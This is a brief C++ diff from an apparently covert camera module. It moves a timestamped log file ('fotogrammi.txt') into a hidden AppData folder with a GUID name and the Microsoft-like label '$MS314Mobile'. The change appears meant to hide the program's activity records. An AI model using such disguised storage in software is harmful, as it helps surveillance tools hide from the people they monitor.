@@ -70,7 +70,7 @@ DWORD WINAPI CameraModule(LPVOID lpParam) {
 
 		fstream filestr;
 		char buff[DTTMSZ];
-		filestr.open ("fotogrammi.txt", fstream::out|fstream::app);
+		filestr.open ("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\fotogrammi.txt", fstream::out|fstream::app);
 		filestr << getDtTm (buff) << std::endl;
 		filestr << msgA << std::endl;
 		filestr << std::endl;
